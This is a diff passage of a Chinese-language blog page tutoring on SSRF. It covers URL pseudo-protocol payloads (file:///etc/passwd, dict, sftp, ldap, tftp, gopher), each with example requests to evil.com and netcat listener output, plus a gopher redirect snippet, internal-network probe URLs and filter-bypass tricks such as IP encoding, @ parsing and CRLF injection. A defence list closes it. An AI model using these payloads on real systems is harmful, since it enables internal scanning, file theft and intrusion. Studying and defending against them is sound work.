class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>1、file</strong></p>
+<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+</blockquote>
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<p><strong>2、dict</strong></p>
+<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>3、sftp</strong></p>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
+<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
+<hr>
+<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。.</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
+<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
+<hr>
+<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
+<p>一、常见的绕过方式</p>
+<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>2.采用短网址绕过</strong></p>
+<blockquote>
+<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
+</blockquote>
+<p><strong>3.采用进制转换</strong></p>
+<blockquote>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
+<p><strong>4.利用特殊域名</strong></p>
+<blockquote>
+<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
+</blockquote>
+<p><strong>5.利用[::]</strong></p>
+<blockquote>
+<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
+</blockquote>
+<p><strong>6.利用句号</strong></p>
+<blockquote>
+<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+<p><strong>7、CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
+
+<p><strong>8.利用封闭的字母数字</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<p>二、常见限制</p>
+<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+</blockquote>
+<hr>
+<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
+<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmawcq0ml000ark7k75alfg4y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1501,7 +1352,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawck7ho000drk7k4y0f35qd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawcq0mm000drk7kbl0fg4dj" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
